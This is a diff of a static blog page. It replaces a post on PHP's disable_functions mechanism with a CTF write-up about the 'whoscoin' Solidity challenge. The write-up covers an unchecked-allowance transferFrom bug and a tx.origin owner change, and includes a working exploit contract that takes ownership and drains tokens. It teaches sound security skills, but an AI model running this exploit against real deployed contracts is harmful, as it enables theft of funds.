@@ -31,21 +31,21 @@
       
         <meta name="lang:search.tokenizer" content="[\s\-]+">
       
-      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.5.0">
     
     
       
-        <title>PHP源码分析(一):disable_function处理机制</title>
+        <title>智能合约题目的基本解法和交互 - Sndav Blog</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.1b62728e.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
       
       
     
     
-      <script src="../../../assets/javascripts/modernizr.268332fc.js"></script>
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
     
     
       
@@ -54,7 +54,7 @@
         <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
       
     
-    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
     
     
     
@@ -84,7 +84,7 @@
   <nav class="md-header-nav md-grid">
     <div class="md-flex">
       <div class="md-flex__cell md-flex__cell--shrink">
-        <a href="../../.." title="Sndav Blog" class="md-header-nav__button md-logo">
+        <a href="../.." title="Sndav Blog" class="md-header-nav__button md-logo">
           
             <i class="md-icon"></i>
           
@@ -101,7 +101,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                PHP源码分析(一):disable_function处理机制
+                智能合约题目的基本解法和交互
               
             </span>
           
@@ -156,7 +156,7 @@
         
   <li class="md-tabs__item">
     
-      <a href="../../.." class="md-tabs__link">
+      <a href="../.." class="md-tabs__link">
         Sndav的博客
       </a>
     
@@ -168,7 +168,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../../Blockchains/智能合约题目的基本解法和交互/" class="md-tabs__link">
+        <a href="./" class="md-tabs__link md-tabs__link--active">
           Blockchains
         </a>
       
@@ -181,7 +181,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" class="md-tabs__link">
+        <a href="../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" class="md-tabs__link">
           CVE复现
         </a>
       
@@ -194,7 +194,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../2019-07-09-parse-str存在的一些问题/" class="md-tabs__link md-tabs__link--active">
+        <a href="../../Research/2019-07-09-parse-str存在的一些问题/" class="md-tabs__link">
           Research
         </a>
       
@@ -207,7 +207,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../../Self-Training/2019-09-01-Pwn堆学习-day1/" class="md-tabs__link">
+        <a href="../../Self-Training/2019-09-01-Pwn堆学习-day1/" class="md-tabs__link">
           Self Training
         </a>
       
@@ -220,7 +220,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../../Writeup/2019-07-08-WCTF2019-Writeup/" class="md-tabs__link">
+        <a href="../../Writeup/2019-07-08-WCTF2019-Writeup/" class="md-tabs__link">
           Writeup
         </a>
       
@@ -241,7 +241,7 @@
                   <div class="md-sidebar__inner">
                     <nav class="md-nav md-nav--primary" data-md-level="0">
   <label class="md-nav__title md-nav__title--site" for="__drawer">
-    <a href="../../.." title="Sndav Blog" class="md-nav__button md-logo">
+    <a href="../.." title="Sndav Blog" class="md-nav__button md-logo">
       
         <i class="md-icon"></i>
       
@@ -257,7 +257,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../.." title="Sndav的博客" class="md-nav__link">
+    <a href="../.." title="Sndav的博客" class="md-nav__link">
       Sndav的博客
     </a>
   </li>
@@ -267,10 +267,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
     
     <label class="md-nav__link" for="nav-2">
       Blockchains
@@ -286,11 +288,63 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../../../Blockchains/智能合约题目的基本解法和交互/" title="智能合约题目的基本解法和交互" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        智能合约题目的基本解法和交互
+      </label>
+    
+    <a href="./" title="智能合约题目的基本解法和交互" class="md-nav__link md-nav__link--active">
       智能合约题目的基本解法和交互
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    题目分析
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    智能合约的交互
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    合约逆向
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -324,7 +378,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" title="ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection" class="md-nav__link">
+    <a href="../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" title="ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection" class="md-nav__link">
       ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection
     </a>
   </li>
@@ -339,12 +393,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
     
     <label class="md-nav__link" for="nav-4">
       Research
@@ -362,7 +414,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../2019-07-09-parse-str存在的一些问题/" title="parse_str存在的一些问题" class="md-nav__link">
+    <a href="../../Research/2019-07-09-parse-str存在的一些问题/" title="parse_str存在的一些问题" class="md-nav__link">
       parse_str存在的一些问题
     </a>
   </li>
@@ -374,7 +426,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../2019-08-31-利用OpCode绕过Python沙箱/" title="2019 08 31 利用OpCode绕过Python沙箱" class="md-nav__link">
+    <a href="../../Research/2019-08-31-利用OpCode绕过Python沙箱/" title="2019 08 31 利用OpCode绕过Python沙箱" class="md-nav__link">
       2019 08 31 利用OpCode绕过Python沙箱
     </a>
   </li>
@@ -386,7 +438,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../2019-09-30-ThinkPHP6-0反序列化利用链/" title="ThinkPHP6.0反序列化利用链" class="md-nav__link">
+    <a href="../../Research/2019-09-30-ThinkPHP6-0反序列化利用链/" title="ThinkPHP6.0反序列化利用链" class="md-nav__link">
       ThinkPHP6.0反序列化利用链
     </a>
   </li>
@@ -398,7 +450,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../2019-11-22-curl-SSRF-FPM造成RCE/" title="curl-SSRF+FPM造成RCE" class="md-nav__link">
+    <a href="../../Research/2019-11-22-curl-SSRF-FPM造成RCE/" title="curl-SSRF+FPM造成RCE" class="md-nav__link">
       curl-SSRF+FPM造成RCE
     </a>
   </li>
@@ -408,12 +460,10 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-5" type="checkbox" id="nav-4-5" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-5" type="checkbox" id="nav-4-5">
     
     <label class="md-nav__link" for="nav-4-5">
       PHP源码解读
@@ -431,7 +481,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../2020-01-17-PHP源码分析-零-调试环境搭建/" title="PHP源码分析(零):调试环境搭建" class="md-nav__link">
+    <a href="../../Research/PHP源码解读/2020-01-17-PHP源码分析-零-调试环境搭建/" title="PHP源码分析(零):调试环境搭建" class="md-nav__link">
       PHP源码分析(零):调试环境搭建
     </a>
   </li>
@@ -441,52 +491,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        PHP源码分析(一):disable_function处理机制
-      </label>
-    
-    <a href="./" title="PHP源码分析(一):disable_function处理机制" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../../Research/PHP源码解读/2020-02-26-PHP源码分析-一-disable-function处理机制/" title="PHP源码分析(一):disable_function处理机制" class="md-nav__link">
       PHP源码分析(一):disable_function处理机制
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    入口函数
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#zend_disable_function" class="md-nav__link">
-    zend_disable_function
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -496,7 +505,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../2020-03-16-PHP源码分析-二-通过PHP插件HOOK-PHP函数/" title="PHP源码分析(二):通过PHP插件HOOK PHP函数" class="md-nav__link">
+    <a href="../../Research/PHP源码解读/2020-03-16-PHP源码分析-二-通过PHP插件HOOK-PHP函数/" title="PHP源码分析(二):通过PHP插件HOOK PHP函数" class="md-nav__link">
       PHP源码分析(二):通过PHP插件HOOK PHP函数
     </a>
   </li>
@@ -508,7 +517,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../2020-03-31-对PHP中文件读漏洞利用的新方式/" title="对PHP中文件读漏洞利用的新方式" class="md-nav__link">
+    <a href="../../Research/PHP源码解读/2020-03-31-对PHP中文件读漏洞利用的新方式/" title="对PHP中文件读漏洞利用的新方式" class="md-nav__link">
       对PHP中文件读漏洞利用的新方式
     </a>
   </li>
@@ -549,7 +558,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/2019-09-01-Pwn堆学习-day1/" title="2019 09 01 Pwn堆学习 day1" class="md-nav__link">
+    <a href="../../Self-Training/2019-09-01-Pwn堆学习-day1/" title="2019 09 01 Pwn堆学习 day1" class="md-nav__link">
       2019 09 01 Pwn堆学习 day1
     </a>
   </li>
@@ -561,7 +570,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/2020-07-15-暑假学习-Day2/" title="暑假学习-Day2" class="md-nav__link">
+    <a href="../../Self-Training/2020-07-15-暑假学习-Day2/" title="暑假学习-Day2" class="md-nav__link">
       暑假学习-Day2
     </a>
   </li>
@@ -573,7 +582,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/2020-07-17-暑假学习-Day3/" title="暑假学习-Day3" class="md-nav__link">
+    <a href="../../Self-Training/2020-07-17-暑假学习-Day3/" title="暑假学习-Day3" class="md-nav__link">
       暑假学习-Day3
     </a>
   </li>
@@ -585,7 +594,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week-8-A/" title="个人练习WP Week 8 A" class="md-nav__link">
+    <a href="../../Self-Training/Week-8-A/" title="个人练习WP Week 8 A" class="md-nav__link">
       个人练习WP Week 8 A
     </a>
   </li>
@@ -597,7 +606,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week-8-B/" title="个人练习WP Week 8 B" class="md-nav__link">
+    <a href="../../Self-Training/Week-8-B/" title="个人练习WP Week 8 B" class="md-nav__link">
       个人练习WP Week 8 B
     </a>
   </li>
@@ -609,7 +618,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week-8-C/" title="个人练习WP Week 8 C" class="md-nav__link">
+    <a href="../../Self-Training/Week-8-C/" title="个人练习WP Week 8 C" class="md-nav__link">
       个人练习WP Week 8 C
     </a>
   </li>
@@ -621,7 +630,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week3-A/" title="个人练习WP Week 3 A" class="md-nav__link">
+    <a href="../../Self-Training/Week3-A/" title="个人练习WP Week 3 A" class="md-nav__link">
       个人练习WP Week 3 A
     </a>
   </li>
@@ -633,7 +642,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week3-B/" title="个人练习WP Week 3 B" class="md-nav__link">
+    <a href="../../Self-Training/Week3-B/" title="个人练习WP Week 3 B" class="md-nav__link">
       个人练习WP Week 3 B
     </a>
   </li>
@@ -645,7 +654,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week3-C/" title="个人练习WP Week 3 C" class="md-nav__link">
+    <a href="../../Self-Training/Week3-C/" title="个人练习WP Week 3 C" class="md-nav__link">
       个人练习WP Week 3 C
     </a>
   </li>
@@ -657,7 +666,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week4-0/" title="个人练习WP Week 4 0" class="md-nav__link">
+    <a href="../../Self-Training/Week4-0/" title="个人练习WP Week 4 0" class="md-nav__link">
       个人练习WP Week 4 0
     </a>
   </li>
@@ -669,7 +678,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week4-A/" title="个人练习WP Week 4 A" class="md-nav__link">
+    <a href="../../Self-Training/Week4-A/" title="个人练习WP Week 4 A" class="md-nav__link">
       个人练习WP Week 4 A
     </a>
   </li>
@@ -681,7 +690,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week4-B/" title="个人练习WP Week 4 B" class="md-nav__link">
+    <a href="../../Self-Training/Week4-B/" title="个人练习WP Week 4 B" class="md-nav__link">
       个人练习WP Week 4 B
     </a>
   </li>
@@ -693,7 +702,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week4-C/" title="个人练习WP Week 4 C" class="md-nav__link">
+    <a href="../../Self-Training/Week4-C/" title="个人练习WP Week 4 C" class="md-nav__link">
       个人练习WP Week 4 C
     </a>
   </li>
@@ -705,7 +714,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week5-A/" title="个人练习WP Week 5 A（模版注入）" class="md-nav__link">
+    <a href="../../Self-Training/Week5-A/" title="个人练习WP Week 5 A（模版注入）" class="md-nav__link">
       个人练习WP Week 5 A（模版注入）
     </a>
   </li>
@@ -717,7 +726,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week5-B/" title="个人练习WP Week 5 B" class="md-nav__link">
+    <a href="../../Self-Training/Week5-B/" title="个人练习WP Week 5 B" class="md-nav__link">
       个人练习WP Week 5 B
     </a>
   </li>
@@ -729,7 +738,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week7-A/" title="个人练习WP Week 7 A" class="md-nav__link">
+    <a href="../../Self-Training/Week7-A/" title="个人练习WP Week 7 A" class="md-nav__link">
       个人练习WP Week 7 A
     </a>
   </li>
@@ -741,7 +750,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week7-B/" title="个人练习WP Week 7 B" class="md-nav__link">
+    <a href="../../Self-Training/Week7-B/" title="个人练习WP Week 7 B" class="md-nav__link">
       个人练习WP Week 7 B
     </a>
   </li>
@@ -753,7 +762,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Self-Training/Week7-C/" title="个人练习WP Week 7 C" class="md-nav__link">
+    <a href="../../Self-Training/Week7-C/" title="个人练习WP Week 7 C" class="md-nav__link">
       个人练习WP Week 7 C
     </a>
   </li>
@@ -789,7 +798,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Writeup/2019-07-08-WCTF2019-Writeup/" title="WCTF2019-Writeup" class="md-nav__link">
+    <a href="../../Writeup/2019-07-08-WCTF2019-Writeup/" title="WCTF2019-Writeup" class="md-nav__link">
       WCTF2019-Writeup
     </a>
   </li>
@@ -801,7 +810,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Writeup/2019-07-16-2019-DigApis-Qual/" title="2019-DigApis-预热赛WP" class="md-nav__link">
+    <a href="../../Writeup/2019-07-16-2019-DigApis-Qual/" title="2019-DigApis-预热赛WP" class="md-nav__link">
       2019-DigApis-预热赛WP
     </a>
   </li>
@@ -813,7 +822,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Writeup/2019-07-18-2019-DigApis-Online/" title="2019-DigApis-Online" class="md-nav__link">
+    <a href="../../Writeup/2019-07-18-2019-DigApis-Online/" title="2019-DigApis-Online" class="md-nav__link">
       2019-DigApis-Online
     </a>
   </li>
@@ -825,7 +834,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Writeup/2019-08-11-De1CTF2019-Writeup/" title="De1CTF2019-Writeup" class="md-nav__link">
+    <a href="../../Writeup/2019-08-11-De1CTF2019-Writeup/" title="De1CTF2019-Writeup" class="md-nav__link">
       De1CTF2019-Writeup
     </a>
   </li>
@@ -837,7 +846,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../Writeup/2020-07-13-GeekPwn-Web复盘-1/" title="GeekPwn-Web复盘(1)" class="md-nav__link">
+    <a href="../../Writeup/2020-07-13-GeekPwn-Web复盘-1/" title="GeekPwn-Web复盘(1)" class="md-nav__link">
       GeekPwn-Web复盘(1)
     </a>
   </li>
@@ -862,20 +871,29 @@
 <nav class="md-nav md-nav--secondary">
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">Table of contents</label>
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    入口函数
+  <a href="#_2" class="md-nav__link">
+    题目分析
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#zend_disable_function" class="md-nav__link">
-    zend_disable_function
+  <a href="#_3" class="md-nav__link">
+    智能合约的交互
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    合约逆向
   </a>
   
 </li>
@@ -897,98 +915,181 @@
               
                 
                 
-                  <h1>PHP源码分析(一):disable_function处理机制</h1>
-                
-                <h2 id="_1">入口函数</h2>
-<p>入口函数在<code>main/main.c</code>的<code>php_disable_functions()</code></p>
-<!-- more -->
+                <h1 id="_1">智能合约题目的基本解法和交互</h1>
+<p>这是我的第一次做智能合约的题目，这里用来记录一下这个题目的基本解法，和如何与目标合约进行交互，题目选自安恒杯<code>whoscoin</code></p>
+<h2 id="_2">题目分析</h2>
+<pre><code class="solidity">pragma solidity ^0.4.18;
 
-<pre><code class="php">static void php_disable_functions(void)
-{
-    char *s = NULL, *e;
+contract Whoscoin {
 
-    if (!*(INI_STR(&quot;disable_functions&quot;))) {
-        return;
+    uint256 private constant _INITIAL_SUPPLY = 15*10**27;
+    uint8 public decimals = 18;         
+    uint256 public totalSupply;
+    address public owner;
+
+    mapping (address =&gt; uint256) balances; 
+    mapping (address =&gt; mapping (address =&gt; uint256)) allowed;
+
+    event sendFlag(string b64email, string slogan);
+
+    function Whoscoin() public {
+        balances[msg.sender] = _INITIAL_SUPPLY;
+        totalSupply = _INITIAL_SUPPLY;
+        owner = msg.sender;
     }
 
-    e = PG(disable_functions) = strdup(INI_STR(&quot;disable_functions&quot;));
-    if (e == NULL) {
-        return;
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+        require(_to != 0x0);
+        require(balances[_from] &gt;= _value);
+        require(balances[_to] + _value &gt; balances[_to]);
+
+        uint previousBalances = balances[_from] + balances[_to];
+        balances[_from] -= _value;
+        balances[_to] += _value;
+        allowed[_from][msg.sender] -= _value;
+        assert(balances[_from] + balances[_to] == previousBalances);
+
+        return true;
     }
-    while (*e) {
-        switch (*e) {
-            case ' ':
-            case ',':
-                if (s) {
-                    *e = '\0';
-                    zend_disable_function(s, e-s);
-                    s = NULL;
-                }
-                break;
-            default:
-                if (!s) {
-                    s = e;
-                }
-                break;
+
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        allowed[msg.sender][_spender] = _value;
+        return true;
+    }
+
+    function balanceOf(address _owner) constant public returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function allowance(address _owner, address _spender) constant public returns (uint256 remaining) {
+      return allowed[_owner][_spender];
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+          owner = _owner;
         }
-        e++;
     }
-    if (s) {
-        zend_disable_function(s, e-s);
+
+    function payforflag(string b64email) public {
+        require(balanceOf(msg.sender) &gt;= 10000);
+        require(owner == msg.sender);
+        sendFlag(b64email, &quot;bravo!&quot;);
+
+    }
+
+}
+</code></pre>
+
+<p>这里主要的问题是在<code>transferFrom</code>里面，我们看到他并没有对<code>allowed</code>是否满足进行验证，即使不够减，但是我们还是可以减去。</p>
+<pre><code>function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+    require(_to != 0x0);
+    require(balances[_from] &gt;= _value);
+    require(balances[_to] + _value &gt; balances[_to]);
+
+    uint previousBalances = balances[_from] + balances[_to];
+    balances[_from] -= _value;
+    balances[_to] += _value;
+    allowed[_from][msg.sender] -= _value;
+    assert(balances[_from] + balances[_to] == previousBalances);
+
+    return true;
+}
+</code></pre>
+<h2 id="_3">智能合约的交互</h2>
+<p>如何与目标合约进行交互是一个比较重要的问题，我们可以首先在攻击sol文件中引入相应的目标合约</p>
+<pre><code>contract Instance{
+  uint256 _decimals; // STORAGE[0x0]
+  uint256 _totalSupply; // STORAGE[0x1]
+  address  _owner; // STORAGE[0x2]
+  function transferFrom(address varg0, address varg1, uint256 varg2) public payable returns(bool);
+  function balanceOf(address varg0) public payable returns(uint256);
+  function payforflag(string _parm) payable public;
+  function owner() public view returns(address);
+  function changeOwner(address varg0) public;
+  function allowance(address varg0, address varg1) view public returns(uint256);
+  function approve(address varg0, uint256 varg1) public returns(bool);
+  function totalSupply() view public returns(uint256) ;
+}
+</code></pre>
+
+<p>然后我们在攻击函数的构造函数中指定目标合约的地址</p>
+<pre><code>contract Exploit {
+    Instance instance;
+    address _addr = 0x151f21084a3808c7e74c9cA6658883A79045b138;
+
+    function Exploit() public {
+        instance = Instance(_addr);
     }
 }
 </code></pre>
 
-<p>首先其使用<code>INI_STR</code>,并将其赋值到<code>PG(disable_function)</code>中</p>
-<pre><code class="php">e = PG(disable_functions) = strdup(INI_STR(&quot;disable_functions&quot;));
-</code></pre>
+<p>这样我们就可以使用<code>instance.XXX(YYY)</code>（<code>XXX</code>为方法名，<code>YYY</code>为参数）这样的方法调用目标合约的函数，从而进行交互</p>
+<p>所以我们构造如下攻击合约</p>
+<pre><code>pragma solidity ^0.4.18;
+contract Instance{
+  uint256 _decimals; // STORAGE[0x0]
+  uint256 _totalSupply; // STORAGE[0x1]
+  address  _owner; // STORAGE[0x2]
+  function transferFrom(address varg0, address varg1, uint256 varg2) public payable returns(bool);
+  function balanceOf(address varg0) public payable returns(uint256);
+  function payforflag(string _parm) payable public;
+  function owner() public view returns(address);
+  function changeOwner(address varg0) public;
+  function allowance(address varg0, address varg1) view public returns(uint256);
+  function approve(address varg0, uint256 varg1) public returns(bool);
+  function totalSupply() view public returns(uint256) ;
+}
 
-<pre><code>EG():这个宏可以用来访问符号表，函数，资源信息和常量
-CG():用来访问核心全局变量
-PG():PHP全局变量。我们知道php.ini会映射一个或者多个PHP全局结构。举几个使用这个宏的例子：PG(register_globals), PG(safe_mode), PG(memory_limit)
-FG():文件全局变量。大多数文件I/O或相关的全局变量的数据流都塞进标准扩展出口结构。
-</code></pre>
+contract Exploit {
+    Instance instance;
+    address _addr = 0x151f21084a3808c7e74c9cA6658883A79045b138;
 
-<p>然后使用一个大while循环解析变量</p>
-<pre><code class="php">while (*e) {
-    switch (*e) {
-        case ' ':
-        case ',':
-            if (s) {
-                *e = '\0';
-                zend_disable_function(s, e-s);
-                s = NULL;
-            }
-            break;
-        default:
-            if (!s) {
-                s = e;
-            }
-            break;
+    function Exploit() public {
+        instance = Instance(_addr);
     }
-    e++;
+
+    function attack(string email) public payable{
+        address bankAddr = instance.owner();
+        instance.changeOwner(this);
+        instance.transferFrom(bankAddr,this,10000);
+        instance.payforflag(email);
+    }
+
 }
 </code></pre>
 
-<p>之后进入<code>zend_disable_function</code>注册<code>disable_function</code></p>
-<h2 id="zend_disable_function">zend_disable_function</h2>
-<pre><code class="php">ZEND_API int zend_disable_function(char *function_name, size_t function_name_length) /* {{{ */
-{
-    zend_internal_function *func;
-    if ((func = zend_hash_str_find_ptr(CG(function_table), function_name, function_name_length))) {
-        zend_free_internal_arg_info(func);
-        func-&gt;fn_flags &amp;= ~(ZEND_ACC_VARIADIC | ZEND_ACC_HAS_TYPE_HINTS | ZEND_ACC_HAS_RETURN_TYPE);
-        func-&gt;num_args = 0;
-        func-&gt;arg_info = NULL;
-        func-&gt;handler = ZEND_FN(display_disabled_function);
-        return SUCCESS;
-    }
-    return FAILURE;
+<h2 id="_4">合约逆向</h2>
+<p>有源码的情况合约的攻击并不包含逆向，当没有源码时，我们便需要对其字节码进行逆向，我们可以使用如下工具：</p>
+<ul>
+<li>https://ethervm.io/decompile/</li>
+<li>https://ropsten.etherscan.io/bytecode-decompiler</li>
+<li>https://contract-library.com/</li>
+</ul>
+<p>根据Sissel的推荐，我们使用<code>https://ethervm.io/decompile/</code>进行合约逆向</p>
+<pre><code>function approve(var arg0, var arg1) returns (var r0) {
+    memory[0x00:0x20] = msg.sender;
+    memory[0x20:0x40] = 0x04;
+    var temp0 = keccak256(memory[0x00:0x40]);
+    memory[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;
+    memory[0x20:0x40] = temp0;
+    storage[keccak256(memory[0x00:0x40])] = arg1;
+    return 0x01;
 }
 </code></pre>
 
-<p>首先在<code>CG(function_table)</code>查找func,如果找到了，则设置<code>func-&gt;handler</code>为<code>ZEND_FN(display_disabled_function)</code>
-这样做可以完全防止<code>disable_function</code>的执行</p>
+<p>看起来和吃了shit一样，不过头铁应该还是可以看懂的。可以在上面看到变量类型</p>
+<pre><code>0x095ea7b3 approve(address,uint256)
+0x18160ddd totalSupply()
+0x23b872dd transferFrom(address,address,uint256)
+0x313ce567 decimals()
+0x6bc344bc payforflag(string)
+0x70a08231 balanceOf(address)
+0x8da5cb5b owner()
+0xa6f9dae1 changeOwner(address)
+0xdd62ed3e allowance(address,address
+</code></pre>
                 
                   
                 
@@ -1009,7 +1110,7 @@ FG():文件全局变量。大多数文件I/O或相关的全局变量的数据流
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../2020-01-17-PHP源码分析-零-调试环境搭建/" title="PHP源码分析(零):调试环境搭建" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../.." title="Sndav的博客" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -1018,19 +1119,19 @@ FG():文件全局变量。大多数文件I/O或相关的全局变量的数据流
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                PHP源码分析(零):调试环境搭建
+                Sndav的博客
               </span>
             </div>
           </a>
         
         
-          <a href="../2020-03-16-PHP源码分析-二-通过PHP插件HOOK-PHP函数/" title="PHP源码分析(二):通过PHP插件HOOK PHP函数" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../CVE复现/2019-07-17-ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection/" title="ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                PHP源码分析(二):通过PHP插件HOOK PHP函数
+                ThinkPHP-SQL-Performance-analysis-Leads-to-SQL-Injection
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
@@ -1058,9 +1159,9 @@ FG():文件全局变量。大多数文件I/O或相关的全局变量的数据流
       
     </div>
     
-      <script src="../../../assets/javascripts/application.a8b5e56f.js"></script>
+      <script src="../../assets/javascripts/application.a8b5e56f.js"></script>
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../.."}})</script>
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
       
     
   </body>
